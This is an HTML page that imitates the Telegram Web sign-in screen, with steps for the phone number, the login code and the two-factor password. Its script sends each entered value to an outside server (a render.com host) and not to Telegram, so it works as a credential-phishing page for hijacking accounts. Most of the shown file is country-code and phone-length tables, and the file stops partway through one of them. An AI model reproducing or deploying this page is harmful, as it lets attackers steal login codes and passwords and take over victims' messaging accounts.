<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        /* General Reset */
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            padding: 40px;
            border: 2px solid #ddd;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 400px; /* Fixed width */
            height: 550px; /* Increased height to accommodate more content */
            text-align: center;
            overflow: hidden; /* Prevent content from overflowing */
            position: relative; /* Needed for positioning the security banner */
        }

        .logo {
            width: 70px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            margin: 0 0 10px;
            color: #333;
        }

        p {
            font-size: 14px;
            color: #666;
            margin: 0 0 20px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            display: block;
        }

        select,
        input[type="tel"],
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
            transition: all 0.3s ease;
            /* For smooth transition when shaking */
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .checkbox-group input {
            margin-right: 10px;
        }

        .checkbox-group label {
            font-size: 14px;
            color: #333;
        }

        .btn {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            background-color: #0088cc;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .btn:hover {
            background-color: #007ab8;
        }

        .hidden {
            display: none;
        }

        .avatar {
            width: 100px;
            height: 100px;
            background-image: url('https://telegram.org/img/monkey_avatar.png');
            background-size: cover;
            background-position: center;
            animation: bounce 2s infinite;
            margin: 20px auto;
        }

        @keyframes bounce {

            0%,
            100% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-15px);
            }
        }

        .phone-number {
            margin-top: 20px;
            font-size: 1.5rem;
            color: #333;
        }

        .phone-number .edit-icon {
            font-size: 1.6rem;
            color: #0078ff;
            cursor: pointer;
            margin-left: x;
        }

        #result {
            color: #ff0000;
            /* Red color for errors */
            font-size: 14px;
            margin-top: 5px;
            margin-bottom: 10px;
        }

        #codeResult {
            color: #ff0000;
            /* Red color for errors */
            font-size: 14px;
            margin-top: 5px;
            margin-bottom: 10px;
        }

        #passwordResult {
            color: #ff0000;
            /* Red color for errors */
            font-size: 14px;
            margin-top: 5px;
            margin-bottom: 10px;
        }

        #loadingSpinner {
            margin-left: 10px;
        }

        .spinner {
            animation: rotate 2s linear infinite;
            z-index: 2;
            width: 20px;
            height: 20px;
        }

        .spinner .path {
            stroke: #fff;
            stroke-linecap: round;
            animation: dash 1.5s ease-in-out infinite;
        }

        @keyframes rotate {
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes dash {
            0% {
                stroke-dasharray: 1, 150;
                stroke-dashoffset: 0;
            }

            50% {
                stroke-dasharray: 90, 150;
                stroke-dashoffset: -35;
            }

            100% {
                stroke-dasharray: 90, 150;
                stroke-dashoffset: -124;
            }
        }

        /* Shake animation */
        @keyframes shake {

            0%,
            100% {
                transform: translateX(0);
            }

            10%,
            30%,
            50%,
            70%,
            90% {
                transform: translateX(-8px);
            }

            20%,
            40%,
            60%,
            80% {
                transform: translateX(8px);
            }
        }

        .shake {
            animation: shake 0.2s;
        }
    </style>
</head>

<body>
    <div class="login-container" id="step1">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
            class="logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>
        <form id="loginForm">
            <div class="input-group">
                <label for="country">Country</label>
                <select id="country" name="country">

                     <!-- New countries -->
                   <option value="Afghanistan">Afghanistan (+93)</option>
                   <option value="Albania">Albania (+355)</option>
                   <option value="Algeria">Algeria (+213)</option>
                   <option value="Andorra">Andorra (+376)</option>
                   <option value="Angola">Angola (+244)</option>
                   <option value="Antigua and Barbuda">Antigua and Barbuda (+1 268)</option>
                   <option value="Argentina">Argentina (+54)</option>
                   <option value="Armenia">Armenia (+374)</option>
                   <option value="Australia">Australia (+61)</option>
                   <option value="Austria">Austria (+43)</option>
                   <option value="Azerbaijan">Azerbaijan (+994)</option>
                   <option value="Bahamas">Bahamas (+1 242)</option>
                   <option value="Bahrain">Bahrain (+973)</option>
                   <option value="Bangladesh">Bangladesh (+880)</option>
                   <option value="Barbados">Barbados (+1 246)</option>
                   <option value="Belarus">Belarus (+375)</option>
                   <option value="Belgium">Belgium (+32)</option>
                   <option value="Belize">Belize (+501)</option>
                   <option value="Benin">Benin (+229)</option>
                   <option value="Bhutan">Bhutan (+975)</option>
                   <option value="Bolivia">Bolivia (+591)</option>
                   <option value="Bosnia and Herzegovina">Bosnia and Herzegovina (+387)</option>
                   <option value="Botswana">Botswana (+267)</option>
                   <option value="Brazil">Brazil (+55)</option>
                   <option value="Brunei">Brunei (+673)</option>
                   <option value="Bulgaria">Bulgaria (+359)</option>
                   <option value="Burkina Faso">Burkina Faso (+226)</option>
                   <option value="Burundi">Burundi (+257)</option>
                   <option value="Cambodia">Cambodia (+855)</option>
                   <option value="Cameroon">Cameroon (+237)</option>
                   <option value="Canada">Canada (+1)</option>
                   <option value="Central African Republic">Central African Republic (+236)</option>
                   <option value="Chad">Chad (+235)</option>
                   <option value="Chile">Chile (+56)</option>
                   <option value="China">China (+86)</option>
                   <option value="Colombia">Colombia (+57)</option>
                   <option value="Comoros">Comoros (+269)</option>
                   <option value="Congo (Brazzaville)">Congo (Brazzaville) (+242)</option>
                   <option value="Congo (Kinshasa)">Congo (Kinshasa) (+243)</option>
                   <option value="Costa Rica">Costa Rica (+506)</option>
                   <option value="Côte d'Ivoire">Côte d'Ivoire (+225)</option>
                   <option value="Croatia">Croatia (+385)</option>
                   <option value="Cuba">Cuba (+53)</option>
                   <option value="Cyprus">Cyprus (+357)</option>
                   <option value="Czech Republic">Czech Republic (+420)</option>
                   <option value="Denmark">Denmark (+45)</option>
                   <option value="Djibouti">Djibouti (+253)</option>
                   <option value="Dominica">Dominica (+1 767)</option>
                   <option value="Dominican Republic">Dominican Republic (+1 809)</option>
                   <option value="Ecuador">Ecuador (+593)</option>
                   <option value="Egypt">Egypt (+20)</option>
                   <option value="El Salvador">El Salvador (+503)</option>
                   <option value="Equatorial Guinea">Equatorial Guinea (+240)</option>
                   <option value="Eritrea">Eritrea (+291)</option>
                   <option value="Estonia">Estonia (+372)</option>
                   <option value="Eswatini">Eswatini (+268)</option>
                   <option value="Ethiopia" selected>Ethiopia (+251)</option>
                   <option value="Fiji">Fiji (+679)</option>
                   <option value="Finland">Finland (+358)</option>
                   <option value="France">France (+33)</option>
                   <option value="Gabon">Gabon (+241)</option>
                   <option value="Gambia">Gambia (+220)</option>
                   <option value="Georgia">Georgia (+995)</option>
                   <option value="Germany">Germany (+49)</option>
                   <option value="Ghana">Ghana (+233)</option>
                   <option value="Greece">Greece (+30)</option>
                   <option value="Grenada">Grenada (+1 473)</option>
                   <option value="Guatemala">Guatemala (+502)</option>
                   <option value="Guinea">Guinea (+224)</option>
                   <option value="Guinea-Bissau">Guinea-Bissau (+245)</option>
                   <option value="Guyana">Guyana (+592)</option>
                   <option value="Haiti">Haiti (+509)</option>
                   <option value="Honduras">Honduras (+504)</option>
                   <option value="Hungary">Hungary (+36)</option>
                   <option value="Iceland">Iceland (+354)</option>
                   <option value="India">India (+91)</option>
                   <option value="Indonesia">Indonesia (+62)</option>
                   <option value="Iraq">Iraq (+964)</option>
                   <option value="Ireland">Ireland (+353)</option>
                   <option value="Israel">Israel (+972)</option>
                   <option value="Italy">Italy (+39)</option>
                   <option value="Jamaica">Jamaica (+1 876)</option>
                   <option value="Japan">Japan (+81)</option>
                   <option value="Jordan">Jordan (+962)</option>
                   <option value="Kazakhstan">Kazakhstan (+7)</option>
                   <option value="Kenya">Kenya (+254)</option>
                   <option value="Kiribati">Kiribati (+686)</option>
                   <option value="Kosovo">Kosovo (+383)</option>
                   <option value="Kuwait">Kuwait (+965)</option>
                   <option value="Kyrgyzstan">Kyrgyzstan (+996)</option>
                   <option value="Laos">Laos (+856)</option>
                   <option value="Latvia">Latvia (+371)</option>
                   <option value="Lebanon">Lebanon (+961)</option>
                   <option value="Lesotho">Lesotho (+266)</option>
                   <option value="Liberia">Liberia (+231)</option>
                   <option value="Libya">Libya (+218)</option>
                   <option value="Liechtenstein">Liechtenstein (+423)</option>
                   <option value="Lithuania">Lithuania (+370)</option>
                   <option value="Luxembourg">Luxembourg (+352)</option>
                   <option value="Macedonia (FYROM)">Macedonia (FYROM) (+389)</option>
                   <option value="Madagascar">Madagascar (+261)</option>
                   <option value="Malawi">Malawi (+265)</option>
                   <option value="Malaysia">Malaysia (+60)</option>
                   <option value="Maldives">Maldives (+960)</option>
                   <option value="Mali">Mali (+223)</option>
                   <option value="Malta">Malta (+356)</option>
                   <option value="Marshall Islands">Marshall Islands (+692)</option>
                   <option value="Mauritania">Mauritania (+222)</option>
                   <option value="Mauritius">Mauritius (+230)</option>
                   <option value="Mexico">Mexico (+52)</option>
                   <option value="Micronesia">Micronesia (+691)</option>
                   <option value="Moldova">Moldova (+373)</option>
                   <option value="Monaco">Monaco (+377)</option>
                   <option value="Mongolia">Mongolia (+976)</option>
                   <option value="Montenegro">Montenegro (+382)</option>
                   <option value="Morocco">Morocco (+212)</option>
                   <option value="Mozambique">Mozambique (+258)</option>
                   <option value="Myanmar (Burma)">Myanmar (Burma) (+95)</option>
                   <option value="Namibia">Namibia (+264)</option>
                   <option value="Nauru">Nauru (+674)</option>
                   <option value="Nepal">Nepal (+977)</option>
                   <option value="Netherlands">Netherlands (+31)</option>
                   <option value="New Zealand">New Zealand (+64)</option>
                   <option value="Nicaragua">Nicaragua (+505)</option>
                   <option value="Niger">Niger (+227)</option>
                   <option value="Nigeria">Nigeria (+234)</option>
                   <option value="Norway">Norway (+47)</option>
                   <option value="Oman">Oman (+968)</option>
                   <option value="Pakistan">Pakistan (+92)</option>
                   <option value="Palau">Palau (+680)</option>
                   <option value="Panama">Panama (+507)</option>
                   <option value="Papua New Guinea">Papua New Guinea (+675)</option>
                   <option value="Paraguay">Paraguay (+595)</option>
                   <option value="Peru">Peru (+51)</option>
                   <option value="Philippines">Philippines (+63)</option>
                   <option value="Poland">Poland (+48)</option>
                   <option value="Portugal">Portugal (+351)</option>
                   <option value="Qatar">Qatar (+974)</option>
                   <option value="Romania">Romania (+40)</option>
                   <option value="Russia">Russia (+7)</option>
                   <option value="Rwanda">Rwanda (+250)</option>
                   <option value="Saint Kitts and Nevis">Saint Kitts and Nevis (+1 869)</option>
                   <option value="Saint Lucia">Saint Lucia (+1 758)</option>
                   <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines (+1 784)</option>
                   <option value="Samoa">Samoa (+685)</option>
                   <option value="San Marino">San Marino (+378)</option>
                   <option value="Sao Tome and Principe">Sao Tome and Principe (+239)</option>
                   <option value="Saudi Arabia">Saudi Arabia (+966)</option>
                   <option value="Senegal">Senegal (+221)</option>
                   <option value="Serbia">Serbia (+381)</option>
                   <option value="Seychelles">Seychelles (+248)</option>
                   <option value="Sierra Leone">Sierra Leone (+232)</option>
                   <option value="Singapore">Singapore (+65)</option>
                   <option value="Sint Maarten (Dutch part)">Sint Maarten (Dutch part) (+1 721)</option>
                   <option value="Slovakia">Slovakia (+421)</option>
                   <option value="Slovenia">Slovenia (+386)</option>
                   <option value="Solomon Islands">Solomon Islands (+677)</option>
                   <option value="Somalia">Somalia (+252)</option>
                   <option value="South Africa">South Africa (+27)</option>
                   <option value="South Korea">South Korea (+82)</option>
                   <option value="South Sudan">South Sudan (+211)</option>
                   <option value="Spain">Spain (+34)</option>
                   <option value="Sri Lanka">Sri Lanka (+94)</option>
                   <option value="Sudan">Sudan (+249)</option>
                   <option value="Suriname">Suriname (+597)</option>
                   <option value="Sweden">Sweden (+46)</option>
                   <option value="Switzerland">Switzerland (+41)</option>
                   <option value="Tajikistan">Tajikistan (+992)</option>
                   <option value="Tanzania">Tanzania (+255)</option>
                   <option value="Thailand">Thailand (+66)</option>
                   <option value="Timor-Leste (East Timor)">Timor-Leste (East Timor) (+670)</option>
                   <option value="Togo">Togo (+228)</option>
                   <option value="Tonga">Tonga (+676)</option>
                   <option value="Trinidad and Tobago">Trinidad and Tobago (+1 868)</option>
                   <option value="Tunisia">Tunisia (+216)</option>
                   <option value="Turkey">Turkey (+90)</option>
                   <option value="Turkmenistan">Turkmenistan (+993)</option>
                   <option value="Tuvalu">Tuvalu (+688)</option>
                   <option value="Uganda">Uganda (+256)</option>
                   <option value="Ukraine">Ukraine (+380)</option>
                   <option value="United Arab Emirates">United Arab Emirates (+971)</option>
                   <option value="United Kingdom">United Kingdom (+44)</option>
                   <option value="United States">United States (+1)</option>
                   <option value="Uruguay">Uruguay (+598)</option>
                   <option value="Uzbekistan">Uzbekistan (+998)</option>
                   <option value="Vanuatu">Vanuatu (+678)</option>
                   <option value="Vatican City">Vatican City (+379)</option>
                   <option value="Venezuela">Venezuela (+58)</option>
                   <option value="Vietnam">Vietnam (+84)</option>
                   <option value="Yemen">Yemen (+967)</option>
                   <option value="Zambia">Zambia (+260)</option>
                   <option value="Zimbabwe">Zimbabwe (+263)</option>
                </select>
            </div>
            <div class="input-group">
                <label for="phoneNumber">Your phone number</label>
                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Enter your number" required>
                <p id="result"></p>
            </div>
            <div class="checkbox-group">
                <input type="checkbox" id="keepSignedIn" name="keepSignedIn">
                <label for="keepSignedIn">Keep me signed in</label>
            </div>
            <button type="submit" class="btn">
                <span id="btnText1">Next</span>
                <span id="loadingSpinner1" class="hidden">
                    <svg class="spinner" viewBox="0 0 50 50">
                        <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
                    </svg>
                </span>
            </button>
        </form>
    </div>

    <div class="login-container hidden" id="step2">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
            class="logo">
        <div class="phone-number">
            <span id="displayPhoneNumber"></span>
            <span class="edit-icon" onclick="goBack()">✍️</span>
        </div></p></p>
        <p>We've sent the code to the <strong>Telegram</strong> app on your other device.</p>
        <form id="codeForm">
            <div class="input-group">
                <input type="tel" id="code" name="code" placeholder="Code" required>
                <p id="codeResult"></p>
            </div>
            <button type="submit" class="btn">
                <span id="btnText2">NEXT</span>
                <span id="loadingSpinner2" class="hidden">
                    <svg class="spinner" viewBox="0 0 50 50">
                        <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
                    </svg>
                </span>
            </button>
        </form>
    </div>

    <div class="login-container hidden" id="step3">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
            class="logo">
        <h1>Enter Your Password</h1>
        </p>
        <p>Your account is protected with an additional password</p>
        <form id="2faForm">
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
                <p id="passwordResult"></p> <!-- New element for password error -->
            </div>
            <button type="submit" class="btn">
                <span id="btnText3">NEXT</span>
                <span id="loadingSpinner3" class="hidden">
                    <svg class="spinner" viewBox="0 0 50 50">
                        <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
                    </svg>
                </span>
            </button>
        </form>
    </div>

    <script>
        const proxyUrl = 'https://tg-back-m8e0.onrender.com';

        // Function to handle form submission and button state
        async function handleFormSubmit(formId, btnTextId, loadingSpinnerId, originalButtonText, apiEndpoint, dataToSend, successCallback, errorCallback) {
            event.preventDefault();
            const btnText = document.getElementById(btnTextId);
            const loadingSpinner = document.getElementById(loadingSpinnerId);
            btnText.textContent = 'PLEASE WAIT...';
            loadingSpinner.classList.remove('hidden');

            try {
                const response = await fetch(`${proxyUrl}/${apiEndpoint}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(dataToSend),
                });

                const data = await response.json();
                btnText.textContent = originalButtonText;
                loadingSpinner.classList.add('hidden');
                successCallback(data);
            } catch (error) {
                console.error('Error:', error);
                btnText.textContent = originalButtonText;
                loadingSpinner.classList.add('hidden');
                errorCallback();
            }
        }

        // Country code mapping
        const countryCodes = {
            'Afghanistan': '+93',
            'Albania': '+355',
            'Algeria': '+213',
            'Andorra': '+376',
            'Angola': '+244',
            'Antigua and Barbuda': '+1 268',
            'Argentina': '+54',
            'Armenia': '+374',
            'Australia': '+61',
            'Austria': '+43',
            'Azerbaijan': '+994',
            'Bahamas': '+1 242',
            'Bahrain': '+973',
            'Bangladesh': '+880',
            'Barbados': '+1 246',
            'Belarus': '+375',
            'Belgium': '+32',
            'Belize': '+501',
            'Benin': '+229',
            'Bhutan': '+975',
            'Bolivia': '+591',
            'Bosnia and Herzegovina': '+387',
            'Botswana': '+267',
            'Brazil': '+55',
            'Brunei': '+673',
            'Bulgaria': '+359',
            'Burkina Faso': '+226',
            'Burundi': '+257',
            'Cambodia': '+855',
            'Cameroon': '+237',
            'Canada': '+1',
            'Central African Republic': '+236',
            'Chad': '+235',
            'Chile': '+56',
            'China': '+86',
            'Colombia': '+57',
            'Comoros': '+269',
            'Congo (Brazzaville)': '+242',
            'Congo (Kinshasa)': '+243',
            'Costa Rica': '+506',
            'Côte d\'Ivoire': '+225',
            'Croatia': '+385',
            'Cuba': '+53',
            'Cyprus': '+357',
            'Czech Republic': '+420',
            'Denmark': '+45',
            'Djibouti': '+253',
            'Dominica': '+1 767',
            'Dominican Republic': '+1 809, 1 829, 1 849',
            'Ecuador': '+593',
            'Egypt': '+20',
            'El Salvador': '+503',
            'Equatorial Guinea': '+240',
            'Eritrea': '+291',
            'Estonia': '+372',
            'Ethiopia': '+251',
            'Fiji': '+679',
            'Finland': '+358',
            'France': '+33',
            'Gabon': '+241',
            'Gambia': '+220',
            'Georgia': '+995',
            'Germany': '+49',
            'Ghana': '+233',
            'Greece': '+30',
            'Grenada': '+1 473',
            'Guatemala': '+502',
            'Guinea': '+224',
            'Guinea-Bissau': '+245',
            'Guyana': '+592',
            'Haiti': '+509',
            'Honduras': '+504',
            'Hungary': '+36',
            'Iceland': '+354',
            'India': '+91',
            'Indonesia': '+62',
            'Iran': '+98',
            'Iraq': '+964',
            'Ireland': '+353',
            'Israel': '+972',
            'Italy': '+39',
            'Jamaica': '+1 876',
            'Japan': '+81',
            'Jordan': '+962',
            'Kazakhstan': '+7',
            'Kenya': '+254',
            'Kiribati': '+686',
            'Kosovo': '+383',
            'Kuwait': '+965',
            'Kyrgyzstan': '+996',
            'Laos': '+856',
            'Latvia': '+371',
            'Lebanon': '+961',
            'Lesotho': '+266',
            'Liberia': '+231',
            'Libya': '+218',
            'Liechtenstein': '+423',
            'Lithuania': '+370',
            'Luxembourg': '+352',
            'Macedonia (FYROM)': '+389',
            'Madagascar': '+261',
            'Malawi': '+265',
            'Malaysia': '+60',
            'Maldives': '+960',
            'Mali': '+223',
            'Malta': '+356',
            'Marshall Islands': '+692',
            'Mauritania': '+222',
            'Mauritius': '+230',
            'Mexico': '+52',
            'Micronesia': '+691',
            'Moldova': '+373',
            'Monaco': '+377',
            'Mongolia': '+976',
            'Montenegro': '+382',
            'Morocco': '+212',
            'Mozambique': '+258',
            'Myanmar (Burma)': '+95',
            'Namibia': '+264',
            'Nauru': '+674',
            'Nepal': '+977',
            'Netherlands': '+31',
            'New Zealand': '+64',
            'Nicaragua': '+505',
            'Niger': '+227',
            'Nigeria': '+234',
            'North Korea': '+850',
            'Norway': '+47',
            'Oman': '+968',
            'Pakistan': '+92',
            'Palau': '+680',
            'Panama': '+507',
            'Papua New Guinea': '+675',
            'Paraguay': '+595',
            'Peru': '+51',
            'Philippines': '+63',
            'Poland': '+48',
            'Portugal': '+351',
            'Qatar': '+974',
            'Romania': '+40',
            'Russia': '+7',
            'Rwanda': '+250',
            'Saint Kitts and Nevis': '+1 869',
            'Saint Lucia': '+1 758',
            'Saint Vincent and the Grenadines': '+1 784',
            'Samoa': '+685',
            'San Marino': '+378',
            'Sao Tome and Principe': '+239',
            'Saudi Arabia': '+966',
            'Senegal': '+221',
            'Serbia': '+381',
            'Seychelles': '+248',
            'Sierra Leone': '+232',
            'Singapore': '+65',
            'Sint Maarten (Dutch part)': '+1 721',
            'Slovakia': '+421',
            'Slovenia': '+386',
            'Solomon Islands': '+677',
            'Somalia': '+252',
            'South Africa': '+27',
            'South Korea': '+82',
            'South Sudan': '+211',
            'Spain': '+34',
            'Sri Lanka': '+94',
            'Sudan': '+249',
            'Suriname': '+597',
            'Swaziland': '+268',
            'Sweden': '+46',
            'Switzerland': '+41',
            'Syria': '+963',
            'Tajikistan': '+992',
            'Tanzania': '+255',
            'Thailand': '+66',
            'Timor-Leste (East Timor)': '+670',
            'Togo': '+228',
            'Tonga': '+676',
            'Trinidad and Tobago': '+1 868',
            'Tunisia': '+216',
            'Turkey': '+90',
            'Turkmenistan': '+993',
            'Tuvalu': '+688',
            'Uganda': '+256',
            'Ukraine': '+380',
            'United Arab Emirates': '+971',
            'United Kingdom': '+44',
            'United States': '+1',
            'Uruguay': '+598',
            'Uzbekistan': '+998',
            'Vanuatu': '+678',
            'Vatican City': '+379',
            'Venezuela': '+58',
            'Vietnam': '+84',
            'Yemen': '+967',
            'Zambia': '+260',
            'Zimbabwe': '+263'
        };

        // Function to validate phone number
        function validatePhoneNumber(phoneNumber, country) {
            // Remove the country code and space
            const numberPart = phoneNumber.replace(countryCodes[country] + ' ', '');
            // Remove all non-digit characters
            const digitsOnly = numberPart.replace(/\D/g, '');

            // Define the minimum and maximum number of digits for each country
            const minDigits = {
                'Afghanistan': 9,
                'Albania': 9,
                'Algeria': 9,
                'Andorra': 9,
                'Angola': 9,
                'Antigua and Barbuda': 7,
                'Argentina': 10,
                'Armenia': 8,
                'Australia': 9,
                'Austria': 10,
                'Azerbaijan': 9,
                'Bahamas': 7,
                'Bahrain': 8,
                'Bangladesh': 11,
                'Barbados': 7,
                'Belarus': 9,
                'Belgium': 9,
                'Belize': 7,
                'Benin': 8,
                'Bhutan': 8,
                'Bolivia': 8,
                'Bosnia and Herzegovina': 9,
                'Botswana': 8,
                'Brazil': 11,
                'Brunei': 8,
                'Bulgaria': 9,
                'Burkina Faso': 8,
                'Burundi': 8,
                'Cambodia': 9,
                'Cameroon': 9,
                'Canada': 10,
                'Central African Republic': 8,
                'Chad': 8,
                'Chile': 9,
                'China': 11,
                'Colombia': 10,
                'Comoros': 9,
                'Congo (Brazzaville)': 9,
                'Congo (Kinshasa)': 9,
                'Costa Rica': 8,
                'Cuba': 8,
                'Cyprus': 8,
                'Czech Republic': 9,
                'Denmark': 8,
                'Djibouti': 8,
                'Dominica': 7,
                'Dominican Republic': 9,
                'Ecuador': 9,
                'Egypt': 11,
                'El Salvador': 8,
                'Equatorial Guinea': 9,
                'Eritrea': 7,
                'Estonia': 8,
                'Ethiopia': 9,
                'Fiji': 7,
                'Finland': 10,
                'France': 9,
                'Gabon': 8,
                'Gambia': 7,
                'Georgia': 9,
                'Germany': 11,
                'Ghana': 9,
                'Greece': 10,
                'Grenada': 7,
                'Guatemala': 8,
                'Guinea': 8,
                'Guinea-Bissau': 8,
                'Guyana': 7,
                'Haiti': 8,
                'Honduras': 8,
                'Hungary': 9,
                'Iceland': 7,
                'India': 10,
                'Indonesia': 11,
                'Iraq': 10,
                'Ireland': 9,
                'Israel': 9,
                'Italy': 10,
                'Jamaica': 8,
                'Japan': 10,
                'Jordan': 9,
                'Kazakhstan': 10,
                'Kenya': 9,
                'Kiribati': 6,
                'Kosovo': 9,
                'Kuwait': 8,
                'Kyrgyzstan': 9,
                'Laos': 8,
                'Latvia': 8,
                'Lebanon': 8,
                'Lesotho': 8,
                'Liberia': 7,
                'Libya': 9,
                'Liechtenstein': 7,
                'Lithuania': 8,
                'Luxembourg': 9,
                'Macedonia (FYROM)': 8,
                'Madagascar': 9,
                'Malawi': 9,
                'Malaysia': 10,
                'Maldives': 7,
                'Mali': 8,
                'Malta': 8,
                'Marshall Islands': 7,
                'Mauritania': 8,
                'Mauritius': 9,
                'Mexico': 10,
                'Micronesia': 7,
                'Moldova': 9,
                'Monaco': 9,
                'Mongolia': 8,
                'Montenegro': 8,
                'Morocco': 9,
                'Mozambique': 9,
                'Myanmar (Burma)': 11,
                'Namibia': 9,
                'Nauru': 7,
                'Nepal': 10,
                'Netherlands': 10,
                'New Zealand': 10,
                'Nicaragua': 8,
                'Niger': 8,
                'Nigeria': 11,
                'Norway': 8,
                'Oman': 8,
                'Pakistan': 10,
                'Palau': 7,
                'Panama': 8,
                'Papua New Guinea': 7,
                'Paraguay': 9,
                'Peru': 9,
                'Philippines': 10,
                'Poland': 9,
                'Portugal': 9,
                'Qatar': 8,
                'Romania': 10,
                'Russia': 10,
                'Rwanda': 9,
                'Saint Kitts and Nevis': 7,
                'Saint Lucia': 7,
                'Saint Vincent and the Grenadines': 7,
                'Samoa': 7,
                'San Marino': 6,
                'Sao Tome and Principe': 7,
                'Saudi Arabia': 9,
                'Senegal': 9,
                'Serbia': 9,
                'Seychelles': 8,
                'Sierra Leone': 7,
                'Singapore': 8,
                'Sint Maarten (Dutch part)': 7,
                'Slovakia': 9,
                'Slovenia': 8,
                'Solomon Islands': 7,
                'Somalia': 9,
                'South Africa': 9,
                'South Korea': 10,
                'South Sudan': 9,
                'Spain': 9,
                'Sri Lanka': 10,
                'Sudan': 9,
                'Suriname': 7,
                'Sweden': 9,
                'Switzerland': 9,
                'Tajikistan': 9,
                'Tanzania': 9,
                'Thailand': 10,
                'Timor-Leste (East Timor)': 7,
                'Togo': 8,
                'Tonga': 7,
                'Trinidad and Tobago': 7,
                'Tunisia': 8,
                'Turkey': 10,
                'Turkmenistan': 8,
                'Tuvalu': 6,
                'Uganda': 9,
                'Ukraine': 10,
                'United Arab Emirates': 9,
                'United Kingdom': 10,
                'United States': 10,
                'Uruguay': 9,
                'Uzbekistan': 9,
                'Vanuatu': 7,
                'Vatican City': 6,
                'Venezuela': 11,
                'Vietnam': 10,
                'Yemen': 9,
                'Zambia': 9,
                'Zimbabwe': 9
            };
            const maxDigits = {
                'Afghanistan': 9,
                'Albania': 9,
                'Algeria': 9,
                'Andorra': 9,
                'Angola': 9,
                'Antigua and Barbuda': 7,
                'Argentina': 10,
                'Armenia': 8,
                'Australia': 9,
                'Austria': 10,
                'Azerbaijan': 9,
                'Bahamas': 7,
                'Bahrain': 8,
                'Bangladesh': 11,
                'Barbados': 7,
                'Belarus': 9,
                'Belgium': 9,
                'Belize': 7,
                'Benin': 8,
                'Bhutan': 8,
                'Bolivia': 8,
                'Bosnia and Herzegovina': 9,
                'Botswana': 8,
                'Brazil': 11,
                'Brunei': 8,
                'Bulgaria': 9,
                'Burkina Faso': 8,
                'Burundi': 8,
                'Cambodia': 9,
                'Cameroon': 9,
                'Canada': 10,
                'Central African Republic': 8,
                'Chad': 8,
                'Chile': 9,
                'China': 11,
                'Colombia': 10,
                'Comoros': 9,
                'Congo (Brazzaville)': 9,
                'Congo (Kinshasa)': 9,
                'Costa Rica': 8,
                'Cuba': 8,
                'Cyprus': 8,
                'Czech Republic': 9,
                'Denmark': 8,
                'Djibouti': 8,
                'Dominica': 7,
                'Dominican Republic': 9,
                'Ecuador': 9,
                'Egypt': 11,
                'El Salvador': 8,
                'Equatorial Guinea': 9,
                'Eritrea': 7,
                'Estonia': 8,
                'Ethiopia': 9,
                'Fiji': 7,
                'Finland': 10,
                'France': 9,
                'Gabon': 8,
                'Gambia': 7,
                'Georgia': 9,
                'Germany': 11,
                'Ghana': 9,
                'Greece': 10,
                'Grenada': 7,
                'Guatemala': 8,
                'Guinea': 8,
                'Guinea-Bissau': 8,
                'Guyana': 7,
                'Haiti': 8,
                'Honduras': 8,
                'Hungary': 9,
                'Iceland': 7,
                'India': 10,
                'Indonesia': 11,
                'Iraq': 10,
                'Ireland': 9,
                'Israel': 9,
                'Italy': 10,
                'Jamaica': 8,
                'Japan': 10,
                'Jordan': 9,
                'Kazakhstan': 10,
                'Kenya': 9,
                'Kiribati': 6,
                'Kosovo': 9,
                'Kuwait': 8,
                'Kyrgyzstan': 9,
                'Laos': 8,
                'Latvia': 8,
                'Lebanon': 8,
                'Lesotho': 8,
                'Liberia': 7,
                'Libya': 9,
                'Liechtenstein': 7,
                'Lithuania': 8,
                'Luxembourg': 9,
                'Macedonia (FYROM)': 8,
                'Madagascar': 9,
                'Malawi': 9,
                'Malaysia': 10,
                'Maldives': 7,
                'Mali': 8,
                'Malta': 8,
                'Marshall Islands': 7,
                'Mauritania': 8,
                'Mauritius': 9,
                'Mexico': 10,
                'Micronesia': 7,
                'Moldova': 9,
                'Monaco': 9,
                'Mongolia': 8,
                'Montenegro': 8,
                'Morocco': 9,
                'Mozambique': 9,
                'Myanmar (Burma)': 11,
                'Namibia': 9,
                'Nauru': 7,
                'Nepal': 10,
                'Netherlands': 10,
                'New Zealand': 10,
                'Nicaragua': 8,
                'Niger': 8,
                'Nigeria': 11,
                'Norway': 8,
                'Oman': 8,
                'Pakistan': 10,
                'Palau': 7,
                'Panama': 8,
                'Papua New Guinea': 7,
                'Paraguay': 9,
                'Peru': 9,
                'Philippines': 10,
                'Poland': 9,
                'Portugal': 9,
                'Qatar': 8,
                'Romania': 10,
                'Russia': 10,
                'Rwanda': 9,
                'Saint Lucia': 7,
                'Saint Vincent and the Grenadines': 7,
                'Samoa': 7,
                'San Marino': 6,
                'Sao Tome and Principe': 7,
